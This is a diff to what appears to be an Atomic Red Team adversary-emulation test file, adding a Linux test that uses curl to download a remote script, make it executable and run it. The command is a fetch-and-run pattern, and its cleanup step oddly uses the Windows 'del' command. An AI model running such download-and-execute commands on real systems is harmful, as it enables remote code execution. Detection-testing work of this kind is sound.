@@ -715,3 +715,23 @@ atomic_tests:
     command: 'wscript.exe #{vbscript_file}'
     cleanup_command: del Atomic-License.txt >nul 2>&1
     name: command_prompt
+- name: Linux Download File and Run
+  description: |
+    Utilize linux Curl to download a remote file, chmod +x it and run it.
+  supported_platforms:
+    - linux
+  input_arguments:
+    remote_url:
+      description: url of remote payload
+      type: string
+      default:  https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1105/src/
+    payload_name:
+      description: payload name
+      type: string
+      default:  atomic.sh
+  executor:
+    command: |
+      curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
+    cleanup_command: |
+      del #{payload_name}
+    name: sh
